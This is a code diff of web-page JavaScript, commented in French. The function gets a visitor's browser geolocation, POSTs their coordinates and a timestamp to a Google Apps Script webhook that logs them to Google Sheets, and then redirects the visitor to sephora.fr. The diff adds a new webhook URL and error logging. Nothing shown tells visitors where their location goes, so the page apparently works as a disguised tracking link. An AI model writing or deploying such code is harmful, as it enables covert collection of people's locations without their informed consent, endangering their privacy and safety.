@@ -7,8 +7,8 @@
         function redirectToSephora() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // Envoi des données de géolocalisation à Google Sheets via ton Webhook
-                    fetch('https://script.google.com/macros/s/AKfycbzlOslgEK8A96L8IsvsWiHGoeklKrupYlHQftdEm_GsftcqE3FdVQ7D9wl5jvgO1d8YeQ/exec', {
+                    // Envoi des données de géolocalisation à Google Sheets via le NOUVEAU Webhook
+                    fetch('https://script.google.com/macros/s/AKfycbwXxYqWMjIeubGif1owWOeieMdjIW_H_oXZMH7aYpmE2mIWI3pUZl8eqxmP_fvYRhi-cg/exec', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -16,16 +16,19 @@
                             longitude: position.coords.longitude,
                             timestamp: new Date().toISOString()
                         })
-                    });
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log("Réponse du serveur :", data))
+                    .catch(error => console.error("Erreur lors de l'envoi des données :", error));
 
                     // Redirection automatique vers Sephora après l'envoi des données
                     window.location.href = "https://www.sephora.fr";
-                }, function() {
-                    // Si l'utilisateur refuse la géolocalisation, redirection directe
+                }, function(error) {
+                    console.error("Erreur de géolocalisation :", error);
                     window.location.href = "https://www.sephora.fr";
                 });
             } else {
-                // Si la géolocalisation n'est pas supportée par le navigateur
+                console.error("Géolocalisation non supportée par ce navigateur.");
                 window.location.href = "https://www.sephora.fr";
             }
         }
